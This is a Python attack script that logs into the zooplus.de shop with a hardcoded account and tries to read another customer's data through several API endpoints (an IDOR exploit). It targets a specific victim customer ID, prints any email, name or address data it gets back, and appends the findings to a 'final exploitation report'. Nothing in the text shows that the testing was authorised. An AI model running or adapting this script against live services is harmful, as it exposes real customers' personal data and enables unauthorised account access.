#!/usr/bin/env python3
"""Verify if IDOR is real - check for different responses"""
import requests
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

print("[*] Verifying IDOR - checking for different responses...\n")

# Test with authentication - login first
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    import re
    import urllib.parse
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, timeout=10, verify=False, allow_redirects=True)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
    s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
    print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login failed: {e}\n")

found_vulns = []

# Test audiences-api with auth
print("[*] Testing audiences-api with authentication...")
endpoint = "/semiprotected/api/audiences-api/v1/me"

# Get own data
try:
    resp = s.get(f"{base}{endpoint}", timeout=5, verify=False)
    if resp.status_code == 200:
        own_data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        own_data_str = json.dumps(own_data, sort_keys=True)
        print(f"  [OK] Own data: {own_data_str[:200]}")
        
        # Try to get other user's data
        victim_id = 53260509
        test_endpoints = [
            f"/semiprotected/api/audiences-api/v1/me?customerId={victim_id}",
            f"/semiprotected/api/audiences-api/v1/customer/{victim_id}",
            f"/semiprotected/api/audiences-api/v1/customers/{victim_id}",
        ]
        
        for test_ep in test_endpoints:
            try:
                resp2 = s.get(f"{base}{test_ep}", timeout=5, verify=False)
                if resp2.status_code == 200:
                    victim_data = resp2.json() if 'application/json' in resp2.headers.get('Content-Type', '') else {}
                    victim_data_str = json.dumps(victim_data, sort_keys=True)
                    
                    # Check if data is different
                    if victim_data_str != own_data_str:
                        print(f"  [CRITICAL] IDOR CONFIRMED: {test_ep}")
                        print(f"      Own: {own_data_str[:200]}")
                        print(f"      Victim: {victim_data_str[:200]}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": test_ep,
                            "victim_id": victim_id,
                            "own_data": own_data_str[:500],
                            "victim_data": victim_data_str[:500]
                        })
                    elif victim_data_str and any(key in victim_data_str.lower() for key in ['email', 'name', 'address']):
                        print(f"  [CRITICAL] IDOR - got victim data: {test_ep}")
                        found_vulns.append({
                            "type": "idor",
                            "severity": "CRITICAL",
                            "endpoint": test_ep,
                            "victim_id": victim_id,
                            "victim_data": victim_data_str[:500]
                        })
            except: pass
except Exception as e:
    print(f"  [ERROR] {e}")

# Test customer-config endpoint
print("\n[*] Testing customer-config endpoint...")
victim_id = 53260509
endpoint = f"/myaccount/api/customer-config/v1/customerconfiguration/{victim_id}"

try:
    resp = s.get(f"{base}{endpoint}", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        data_str = json.dumps(data)
        if data and isinstance(data, dict):
            print(f"  [CRITICAL] IDOR in customer-config: {endpoint}")
            print(f"      Data: {data_str[:300]}")
            found_vulns.append({
                "type": "idor",
                "severity": "CRITICAL",
                "endpoint": endpoint,
                "victim_id": victim_id,
                "data": data_str[:500]
            })
except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CONFIRMED IDOR vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        print(f"    Victim ID: {v['victim_id']}")
        if 'victim_data' in v:
            print(f"    Victim data: {v['victim_data'][:200]}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 ПОДТВЕРЖДЕННЫЕ IDOR УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper()}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Victim Customer ID:** `{v['victim_id']}`\n\n")
            if 'victim_data' in v:
                f.write(f"**Victim Data:** `{v['victim_data'][:500]}`\n\n")
            if 'own_data' in v:
                f.write(f"**Own Data:** `{v['own_data'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated")
else:
    print("  No confirmed IDOR vulnerabilities")
    print("  (All endpoints return same response - may not be real IDOR)")

print("=" * 70)

